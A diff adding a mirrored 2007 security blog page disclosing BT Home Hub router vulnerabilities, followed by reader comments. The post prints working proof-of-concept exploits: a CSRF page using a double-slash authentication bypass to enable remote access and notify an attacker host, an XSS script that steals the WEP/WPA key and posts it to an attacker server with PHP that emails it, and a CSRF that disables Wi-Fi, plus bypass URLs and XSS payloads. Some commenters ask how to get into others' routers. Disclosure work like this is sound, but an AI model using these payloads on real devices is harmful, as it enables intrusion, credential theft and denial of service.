@@ -1,0 +1,636 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:59:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; BT Home Flub: Pwnin the BT Home Hub (4)</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; BT Home Flub: Pwnin the BT Home Hub (4) Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Web Mayhem: Firefox&#8217;s JAR: Protocol issues' href='../web-mayhem-firefoxs-jar-protocol-issues/index.html' />
+<link rel='next' title='Tomorrow&#8217;s Trojan Peddlers' href='../tomorrows-trojan-peddlers/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexfbc0.html?p=537' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-537" class="post">
+	<div class="post-title"><h2><span>BT Home Flub: Pwnin the BT Home Hub (4)</span></h2></div>
+	<div class="post-date"><span>published:</span> November 8th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>The following are the full details of the vulnerabilities we reported (<a href="http://www.securityfocus.com/bid/25972">BID 25972</a>) to BT regarding their Home Hub router. We are going to have a brief detail on all POCs. If you have any suggestions, recommendations or corrections, do not hesitate to <a href="../../contact.html">contact us</a>. <em>All the vulnerabilities and demo exploits discussed below have been tested on version <code>6.2.2.6</code> of the firmware, unless otherwise specified. Have fun and be responsible!</em></p>
+
+<h3>Exploit #1: Enable remote assistance and notify intruder when victim Home Hub is owned</h3>
+
+<p>This is the exploit <a href="../bt-home-flub-pwnin-the-bt-home-hub/index.html">shown</a> in our first demo video on which we forge the <strong>enable remote assistance</strong> request using an authentication bypass bug we found within the router firmware. Even if the victim has changed the password, the request will still go through no matter what. After successful exploitation, the attacker is notified via email with the URL (IP address) needed to control the Home Hub remotely.</p>
+
+<p>In our exploit we set the credentials <strong>tech:12345678</strong>. Notice the double forward slash in the <strong>action</strong> attribute which allows us to bypass the authentication! The exploit Proof of Concept code follows:</p>
+
+<pre><code>&lt;html&gt;
+&lt;!-- index.html --&gt;
+&lt;head&gt;
+&lt;script&gt;
+
+function redirect() {
+
+       targetURL=&quot;http://www.google.com/search?ie=UTF-8&amp;oe=UTF-8&amp;sourceid=navclient&amp;gfns=1&amp;q=techno+viking&quot;;
+       notifyURL=&quot;http://www.attackersdomain.com/notify.php&quot;;
+       imgsrc = &apos;http://192.168.1.254/images/head_wave.gif&apos;;
+       fingerprint_img = new Image();
+
+       fingerprint_img.onerror = function (evt) {
+               ; //alert(this.src + &quot; can&apos;t be loaded.&quot;);
+       }
+
+       // only notify attacker only if potential vulnerable Thomson
+Speedtouch / BT Homehub router found
+       fingerprint_img.onload = function (evt) {
+               //alert(this.src + &quot; is loaded.&quot;);
+               C=new Image();
+               C.src=notifyURL;
+       }
+
+       fingerprint_img.src = imgsrc;
+       setTimeout(&quot;document.location=targetURL&quot;, 500);
+}
+&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;iframe onload=&quot;redirect()&quot; frameborder=0 height=0 width=0
+src=&quot;./ras.html&quot;&gt;&lt;/iframe&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<pre><code>&lt;html&gt;
+&lt;!-- ras.html --&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form name=&apos;raccess&apos;
+action=&apos;http://192.168.1.254/cgi/b/ras//?ce=1&amp;be=1&amp;l0=5&amp;l1=5&apos;
+method=&apos;post&apos;&gt;
+&lt;input type=&apos;hidden&apos; name=&apos;0&apos; value=&apos;31&apos;&gt;
+&lt;input type=&apos;hidden&apos; name=&apos;1&apos; value=&apos;&apos;&gt;
+&lt;input type=&apos;hidden&apos; name=&apos;30&apos; value=&apos;12345678&apos;&gt;
+&lt;!-- &lt;input type=&apos;submit&apos; value=&quot;own it!&quot;&gt; --&gt;
+&lt;/form&gt;
+&lt;script&gt;document.raccess.submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<pre><code>&lt;?php
+// notify.php
+define(&quot;RCPT_EMAIL&quot;, &quot;bthomehubevil@mailinator.com&quot;);
+define(&quot;EMAIL_SUBJECT&quot;, &quot;[OWNED]&quot;);
+
+$messagebody=&quot;victim: https://&quot;.$_SERVER[&apos;REMOTE_ADDR&apos;].&quot;:51003\n&quot;;
+mail(RCPT_EMAIL, EMAIL_SUBJECT, $messagebody);
+?&gt;</code></pre>
+
+<h3>Exploit #2: Steal page containing WEP/WPA key</h3>
+
+<p>The following exploit simply steals the WEP/WPA key from the router. In some situations this is all the attackers need. The exploit URL looks like the following:</p>
+
+<pre><code>http://192.168.1.254/cgi/b/ic/connect/?url=&quot;&gt;&lt;script%20src=http://www.attackersdomain.com/xss.js&gt;&lt;/script&gt;&lt;a%20b%3d</code></pre>
+
+<pre><code>// xss.js
+
+// important - won&apos;t work without having a body
+document.write(&quot;&lt;body&gt;&quot;);
+
+// xhr() - WORKS ON BOTH FF2 AND IE7!
+// original code from developer.apple.com
+var req;
+
+
+// we steal the page that returns the WEP/WPA key. no auth required, can you believe it?
+
+var url=&quot;/cgi/b/_wli_/seccfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0&quot;;
+
+function loadXMLDoc(url)
+{
+        req = false;
+        // branch for native XMLHttpRequest object
+        if(window.XMLHttpRequest &amp;&amp; !(window.ActiveXObject))
+        {
+                try
+                {
+                        req = new XMLHttpRequest();
+                }
+                catch(e)
+                {
+                        req = false;
+                }
+        // branch for IE/Windows ActiveX version
+        }
+
+        else if(window.ActiveXObject)
+        {
+                try
+                {
+                        req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+                }
+                catch(e)
+                {
+                        try
+                        {
+                                req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+                        }
+                        catch(e)
+                        {
+                                req = false;
+                        }
+                }
+        }
+        if(req)
+        {
+                req.onreadystatechange = processReqChange;
+                req.open(&quot;GET&quot;, url, true);
+                req.send(&quot;&quot;);
+        }
+}
+// end of loadXMLDoc(url)
+
+function processReqChange()
+{
+        // only if req shows &quot;loaded&quot;
+        if (req.readyState == 4)
+        {
+                // only if &quot;OK&quot;
+                if (req.status == 200)
+                {
+                        // ...processing statements go here...
+                        //alert(escape(req.responseText));
+
+                        var f=document.createElement(&quot;form&quot;);
+                        f.name=&quot;myform&quot;;
+                        // where you want the captured data to be submitted to
+                        f.action=&quot;http://evil.domain.foo/bthh/steal.php&quot;;
+                        // POST is handy for submitting large chuncks of data
+                        f.method=&quot;POST&quot;;
+                        var t = document.createElement(&apos;INPUT&apos;);
+                        t.type=&apos;hidden&apos;;
+                        t.name=&apos;data&apos;;
+                        t.value=escape(req.responseText);
+                        f.appendChild(t);
+                        document.body.appendChild(f);
+                        f.submit();
+                }
+        }
+}
+
+
+loadXMLDoc(url);
+
+// end of body
+document.write(&quot;&lt;/body&gt;&quot;);</code></pre>
+
+<pre><code>&lt;?php
+// steal.php
+define(&quot;RCPT_EMAIL&quot;, &quot;unknown.pentester@gmail.com&quot;);
+define(&quot;EMAIL_SUBJECT&quot;, &quot;[OWNED]&quot;);
+$messagebody=&quot;victim router: &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;].&quot;\n&quot;;
+
+if($_REQUEST[&apos;data&apos;]) {
+        $messagebody=$messagebody.&quot;page containing WEP/WPA key:&quot;.$_REQUEST[&apos;data&apos;];
+        mail(RCPT_EMAIL, EMAIL_SUBJECT, $messagebody);
+}
+?&gt;</code></pre>
+
+<h3>Exploit #3: Disable wireless connectivity</h3>
+
+<p>This PoC will disable your Wifi permanently unless you re-enable it manually after successful exploitation! In order to re-enable the Wifi interface you can reset to factory settings, or re-enable the setting by connecting to the Home Hub through the ethernet interface. I am not sure what this exploit can be used for but at least it shows a potential quite devastating danger.<p>
+
+<pre><code>&lt;html&gt;
+&lt;!-- index.html --&gt;
+&lt;iframe onload=&quot;javascript:document.body.innerHTML=&apos;&lt;html&gt;&lt;h1&gt;PWNED!&lt;/h1&gt;&apos;&quot; name=&quot;hack&quot; frameborder=0 height=0 width=0 src=&quot;./disable_wifi_interface.html&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;</code></pre>
+
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;!-- disable_wifi_interface.html --&gt;
+
+
+&lt;!--
+    POST /cgi/b/_wli_/cfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0&amp;name= HTTP/1.1
+
+    0=10&amp;1=&amp;32=&amp;33=&amp;34=2&amp;35=1&amp;45=11&amp;47=1
+--&gt;
+
+&lt;form action=&quot;http://192.168.1.254/cgi/b/_wli_/cfg//&quot; method=&quot;post&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;0&quot; value=&quot;10&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;1&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;32&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;33&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;34&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;35&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;45&quot; value=&quot;11&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;47&quot; value=&quot;1&quot;&gt;
+
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<p><em>For the rest of this post we are listing all vulnerabilities that were found in the BT Home Hub router.</em></p>
+
+<h3>Vulnerability #1: System-wide CSRF</h3>
+
+<p>The BT Home Hub is vulnerable to CSRF by design. That means that absolutely ANY request can be forged by an attacker. This includes administrative requests. The only requirement for these attacks to work would be to predict the admin password (many users never change the default admin password), or combine it with a authentication bypass bug like the one we found (more on this later).</p>
+
+<p>As an intruder, you would typically target admin requests that would allow you to compromise the Home Hub. For instance, the following is the request that enables Remote Assistance with a password equals to <em>PASSW0RD</em> (username is <strong>tech</strong>).</p>
+
+<pre><code>POST /cgi/b/ras/?ce=1&amp;be=0&amp;l0=-1&amp;l1=-1 HTTP/1.1
+
+0=31&amp;1=&amp;30=PASSW0RD</code></pre>
+
+<p><em>This issue has also been successfully tested on a Thomson Speedtouch 780 (firmware version 6.1.4.3), which is shipped by Bethere in the UK.</em></p>
+
+<h3>Vulnerability #2: Several non-persistent XSS</h3>
+
+<p>There are a few non-persistent XSS. None of them require the victim to be authenticated with the Home Hub for the scripting code (payload) to run. Why is there some functionality/pages available on the web interface without authenticating? Well, don&#8217;t ask me! Ask BT or Thomson. Several GET parameters are affected:</p>
+
+<ul>
+<li>Through the <code>name</code> parameter (already published on <a href="http://www.securityfocus.com/bid/16839/exploit">BID 16839</a>):
+<pre><code>http://192.168.1.254/cgi/b/intfs/_intf_/ov/?ce=1&amp;be=0&amp;l0=3&amp;l1=1&amp;name=&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</code></pre></li>
+<li>Through the <code>url</code> parameter. This one is a good one because there are not restrictions on the length of the payload or type of characters that can be injected. Plus, it works even if the victim is not authenticated (again, the vulnerable script is available without needing to authenticate)</p>
+<pre><code>http://192.168.1.254/cgi/b/ic/connect/?nm=1&amp;client=192.168.1.64&amp;server=198.18.1.2&amp;event=DNSSpoofed&amp;url=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;a%20b=&quot;
+
+http://192.168.1.254/cgi/b/ic/connect/?nm=1&#038;client=&#038;server=&#038;event=DNSSpoofed&#038;url=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;a%20b=&quot;
+
+
+http://192.168.1.254/cgi/b/ic/connect/?url=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;a%20b=</code></pre></li>
+
+</ul>
+
+<p><em>The last PoC URL has also been successfully tested on a Thomson Speedtouch 780 firmware version 6.1.4.3), which is shipped by Bethere in the UK.</em></p>
+
+<h3>Vulnerability #3: Several persistent XSS</h3>
+
+<p>Persistent XSS on Configuration / Application Sharing / Add new Game or App:</p>
+
+<pre><code>http://192.168.1.254/cgi/b/games/newserv/?ce=1&amp;be=1&amp;l0=4&amp;l1=5&amp;tid=CREATE_GAME</code></pre>
+
+<p>A request which takes advantage of this vulnerability may look like the following::</p>
+
+<pre><code>POST /cgi/b/games/newserv/?ce=1&amp;be=1&amp;l0=4&amp;l1=5&amp;tid=CREATE_GAME HTTP/1.1
+
+0=10&amp;1=&amp;30=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscrip&amp;33=0&amp;32=ABC+%28Another+Bittorent+Client%29</code></pre>
+
+<p>On the other hand, there is a persistent XSS on the logs page by attempting to authenticate (with the web server) using a malformed username:</p>
+
+<pre><code>http://192.168.1.254/cgi/b/events/?ce=1&amp;be=0&amp;l0=3&amp;l1=-1
+
+http://192.168.1.254/cgi/b/events/</code></pre>
+
+<pre><code>Oct 27 16:10:19 LOGIN User <code>[XSS_payload_goes_here]</code> tried to login on [HTTPS] (from 192.168.1.66)</code></pre>
+
+<p>The line where the payload is returned looks like the following:</p>
+
+<pre><code>&lt;td class=&apos;evenrow&apos; align=&apos;left&apos; colspan=&apos;3&apos;&gt;LOGIN User &lt;BADCHARSHERE&gt; tried to login on [HTTP] (from 192.168.1.66)&lt;/td&gt;</code></pre>
+
+<h3>Vulnerability #4: Double-slash Authentication Bypass</h3>
+
+<p>This authentication bypass allows intruders to view any page that would normally require the admin password. Additionally, <em>any administrative request can be made without requiring the admin password</em>. The bug is extremely simple to exploit, and works like a charm! By simply requesting the password-protected resource with two forward slashes, the authentication is bypassed completely. I.e.:</p>
+
+<ul>
+<li>Basic wireless configuration info: <code>http://192.168.1.254/cgi/b/_wli_/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=0</code></li>
+<li>Local network information: <code>http://192.168.1.254/cgi/b/intfs/_intf_/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=3&amp;name=</code></li>
+<li>Firewall security settings: <code>http://192.168.1.254/cgi/b/secpol/cfg//</code> and <code>http://192.168.1.254/cgi/b/secpol/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=7</code></li>
+<li>Internet connection information: <code>http://192.168.1.254/cgi/b/is/_pppoa_/ov//?ce=1&amp;be=1&amp;l0=4&amp;l1=2</code></li>
+<li>Game and Application sharing: <code>http://192.168.1.254/cgi/b/games/cfg//?ce=1&amp;be=1&amp;l0=4&amp;l1=5</code> and <code>http://192.168.1.254/cgi/b/games/cfg//</code></li>
+<li>Remote assistance: <code>http://192.168.1.254/cgi/b/ras//</code></li>
+<li>Backup and Restore: <code>http://192.168.1.254/cgi/b/bandr//</code></li>
+<li><em>Dump config file</em>: <code>http://192.168.1.254/cgi/b/backup/user.ini//</code></li>
+</ul>
+
+<p>Not only administrative pages can be viewed without a password, but administrative changes can also be made. I.e.: the following request enables remote assistance without requiring a password:</p>
+
+<pre><code>POST /cgi/b/ras//?ce=1&amp;be=1&amp;l0=5&amp;l1=5 HTTP/1.1<br />
+
+0=31&amp;1=&amp;30=12345678</code></pre>
+
+<p><em>The previous request could be performed by a malicious website through a hidden form as shown in Exploit #1.</em></p>
+
+<h3>Vulnerability #5: A-to-C authentication bypass</h3>
+
+<p>Let me explain what I mean by <em>A-to-C authentication bypass</em>. Sometimes on a application we&#8217;re supposed to go through an intermediate B point before we reach C. However, sometimes, knowing C in advance might allow you to gain access to data without going through B. In this case, by simply knowing URLs that would only be accessible to authenticated admin users, an attacker can bypass the password prompt completely.</p>
+
+<p>For instance, some pages that are only available after accessing the <em>Advanced</em> section are supposed to require a password to be accessed, but can be accessed without authenticating. i.e.:</p>
+
+<pre><code>http://192.168.1.254/cgi/b/_wli_/seccfg/?ce=1&amp;be=1&amp;l0=4&amp;l1=0</code></pre>
+
+<p>Keep in mind that the WEP/WPA key in the clear. There are other pages whose links can only be seen after authenticating, but can actually be accessed without authenticating by simply accessing the URL directly. However, the Wireless Security page is probably the most interesting one.</p>
+
+<p><em>BT has finally password-protected the Wireless Security page on firmware version 6.2.6.B.</em></p>
+
+<h3>Vulnerability #6: Privilege Escalation</h3>
+
+<p>BT Home Hubs have three accounts by default: <em>Basic</em>, <em>admin</em>, and <em>tech</em>. Since version 6.2.2.6 of the firmware, saving a backup of the config file and loading a new one is restricted to the <em>tech</em> account which is usually used by BT technical support. However, the <em>admin</em> user can access such functionalities by simply accessing any of the following URLs:</p>
+
+<ul>
+<li>http://192.168.1.254/cgi/b/backup/user.ini?0=&amp;1=</li>
+<li>http://192.168.1.254/cgi/b/backup/user.ini</li>
+</ul>
+
+<p><em>This is pretty much it. I hope that you&#8217;ve learned something new. Again, if you have any ideas, suggestions or aditional information, <a href="../../contact.html">contact us</a>.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-67743">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3d6a350133d92590f648098405210bae?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">NurBo</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-67743">
+			November 8, 2007 at 5:43 pm</a>		</div>
+
+		<p>whoa nice stuff</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-67810">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/870419564f7ebe6cb4f631e98e14e5dd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://g-brain.sesoyo.com/' rel='external nofollow' class='url'>G-Brain</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-67810">
+			November 8, 2007 at 10:26 pm</a>		</div>
+
+		<p>NurBo reads this stuff? Hehe&#8230;</p>
+<p>I&#8217;d use $_POST['data'] instead of $_REQUEST['data'] in steal.php though. $_REQUEST contains $_GET, $_POST, and $_COOKIE, and all you need here is $_POST. Furthermore, good job! Nice article.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-67823">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-67823">
+			November 8, 2007 at 11:20 pm</a>		</div>
+
+		<p>@NurBo &#8211; Glad yo like it!</p>
+<p>@G-Brain &#8211; &#8216;steal.php&#8217; is derived from a generic data theft script I wrote long time ago. The idea of the original script is that it works for both, GET and POST, hence the use of $_REQUEST .</p>
+<p>btw guys, there is video we&#8217;re posting soon on this very same page showing a DoS on the BT Home Hub. The exploit takes advantage of the double slash auth bypass + CSRF to disable the wireless connection.</p>
+<p>Although I usually don&#8217;t like DoS attacks, I must say that this one is kind of a killer. Just visit site, and boom, the Home Hub&#8217;s wireless interface is disabled permanently!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-67831">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/870419564f7ebe6cb4f631e98e14e5dd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://g-brain.sesoyo.com/' rel='external nofollow' class='url'>G-Brain</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-67831">
+			November 9, 2007 at 12:00 am</a>		</div>
+
+		<p>I see, thanks for the explanation. I don&#8217;t see why  those definitions of RCPT_EMAIL and EMAIL_SUBJECT are made even when there is no $_REQUEST['data'] though&#8230; ;)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor even thread-even depth-1" id="comment-67990">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-67990">
+			November 9, 2007 at 10:45 am</a>		</div>
+
+		<p>@G-Brain &#8211; fair enough! I see what you mean, I guess I wasted a few CPU cycles in the script. </p>
+<p>You&#8217;re right though, if you want to be perfectionist, the definitions on &#8216;steal.php&#8217; should be under the IF statement.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-69115">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-69115">
+			November 11, 2007 at 1:03 pm</a>		</div>
+
+		<p>Here is the demo video for Exploit #3 : <a href="http://www.youtube.com/watch?v=QiFQPKcAtNI" rel="nofollow">http://www.youtube.com/watch?v=QiFQPKcAtNI</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-76430">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/9c6181302e3a76a1c9738f1b78e9444d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Rob</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-76430">
+			November 24, 2007 at 6:08 pm</a>		</div>
+
+		<p>I don&#8217;t suppose there is an exploit in 6.2.6.B that allows telnet access?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-90087">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/fdb887e38fde4261e4b5b3fb8c627b60?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://1337.com/' rel='external nofollow' class='url'>t3h 1337</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-90087">
+			December 22, 2007 at 8:16 am</a>		</div>
+
+		<p>Any 0day for 626c?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-102197">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7972dcc8e7e86eddc564c5eb3a1692e8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">norm</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-102197">
+			January 21, 2008 at 11:09 pm</a>		</div>
+
+		<p>The new Home Hub firmware (6.2.6E) removes these exploits.</p>
+<p>However if you gain wireless access to the device (which isn&#8217;t difficult if it&#8217;s on WEP) you will find the default password has been changed to the serial number of the device (unless the owner changed it since).</p>
+<p>Now you might think getting the serial number would be impossible without physical access, but using the firmware recovery tool provided by BT it will tell you the serial number on finding it. Then all you do is add the two characters &#8216;CP&#8217; infront of it to make it valid e.g. CP01234ABCD.</p>
+<p>From there I guess the possibility lies with downgrading the firmware to a more vulnerable version.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-125308">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/40f5a29ea61b2169b95eac7972549764?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Noggin</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-125308">
+			January 15, 2009 at 10:58 am</a>		</div>
+
+		<p>I am connected to a BT Home Hub with the WPA2 key (it&#8217;s a long story how I got that!) and when I browse 192.168.1.254 I get the &#8220;Change your admin password for the first time&#8221; screen, showing version 8.1.A</p>
+<p>I&#8217;ve tried entering the serial number (from the BT Home Hub Admin app plus &#8220;CP&#8221; in front) but it tells me it is invalid. I have another BT Home Hub and once I&#8217;ve changed the admin password this screen no longer shows.</p>
+<p>Any ideas how I can gain access to the admin pages?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-125367">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2eef12246100fc6f36b38f176b4edc2b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jonnycorer77</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-125367">
+			January 17, 2009 at 9:05 pm</a>		</div>
+
+		<p>Noggin, take a look at the post concerning bypassing the admin password, all you need is there</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-126701">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0cf27abdf478a70afe234b747f891ad9?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Richard Burns</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126701">
+			April 29, 2009 at 8:00 am</a>		</div>
+
